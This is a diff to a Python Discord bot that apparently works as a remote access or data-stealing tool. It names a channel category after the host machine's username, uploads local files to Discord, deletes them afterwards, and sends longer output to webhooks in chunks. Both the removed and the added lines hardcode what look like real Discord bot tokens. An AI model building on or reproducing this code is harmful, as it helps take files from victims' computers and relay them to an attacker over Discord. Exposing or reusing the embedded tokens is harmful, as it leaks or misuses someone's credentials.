@@ -1,6 +1,5 @@
 import discord
 import random
-from discord_webhook import DiscordWebhook
 import asyncio
 import info
 import utility
@@ -15,10 +14,10 @@ import shutil
 
 
 # Discord bot token
-TOKEN = "MTExNTIwMjU0MzQxNzU2MTE1OQ.GvSXnq.kzE73fkf8iEk6YFPDNJhuJvJXIJKheJQc2LEhY"
+TOKEN = "MTE4NzAwNDA3NzA1ODU3MjMyOA.G4PRvr.wdykm5LPJSa-zKl60OBXjPCy8mEChY0DQGvcLY"
 
 # Discord guild ID
-GUILD_ID = 1115241407628705833
+GUILD_ID = 1297901498805518337
 
 # Random category name
 CATEGORY_NAME = f"{utility.get_username()}"
@@ -30,8 +29,15 @@ main_webhook_url = ""
 
 # Function to send a message to the webhook
 def send_to_webhook(webhook_url, content):
-    webhook = DiscordWebhook(url=webhook_url, content=content)
-    webhook.execute()
+    webhook = discord.SyncWebhook.from_url(webhook_url)
+    if len(content) > 2000:
+        # split into 1500 characters and send
+        for i in range(0, len(content), 1500):
+            webhook.send(content[i:i + 1500])
+            
+        return
+    else:
+        webhook.send(content)
 
 
 # Create a Discord client
@@ -115,7 +121,10 @@ async def on_message(message):
                 return
 
             for file_path in file_paths:
-                await chanle.send(file=discord.File(file_path))
+                try:
+                    await chanle.send(file=discord.File(file_path))
+                except:
+                    pass
 
             # Delete the files and the folder
             await asyncio.sleep(5)
